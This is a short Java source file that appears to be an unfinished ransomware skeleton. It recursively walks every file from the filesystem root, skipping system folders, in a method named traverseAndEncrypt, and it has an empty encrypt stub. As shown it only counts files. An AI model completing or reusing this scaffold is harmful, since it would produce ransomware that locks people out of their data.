import java.io.File;
import java.nio.file.Path;
import java.util.HashSet;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

class App {

    private static final String ROOT_PATH = "/";
    private static int CURR_OS;
    private static HashSet<String> CURR_OS_EXCLUDED_FOLDERS;
    private static int NUM_OF_THREADS;
    private static ExecutorService executorService;
    private static int count = 0;

    public static void main(String[] args) {
        CURR_OS = OS.WINDOWS;
        NUM_OF_THREADS = 750;
        executorService = Executors.newFixedThreadPool(NUM_OF_THREADS);
        CURR_OS_EXCLUDED_FOLDERS = CURR_OS == OS.WINDOWS ? OS.Windows.getExcludedFolders() : OS.Linux.getExcludedFolders();
        traverseAndEncrypt(new File(ROOT_PATH).listFiles());
    }

    public static void traverseAndEncrypt(File[] files) {
        if (files == null) {
            return;
        }

        for (File file : files) {
            if (file.isDirectory()) {
                    if (!CURR_OS_EXCLUDED_FOLDERS.contains(file.getName().toLowerCase())) {
                        //System.out.println("Directory: " + file.getAbsolutePath());
                        traverseAndEncrypt(file.listFiles());
                    }
            } else {
                System.out.println(count++);
                //System.out.println("File: " + file.getAbsolutePath());
            }
        }
    }

    public static void encrypt(Path path) {

    }
}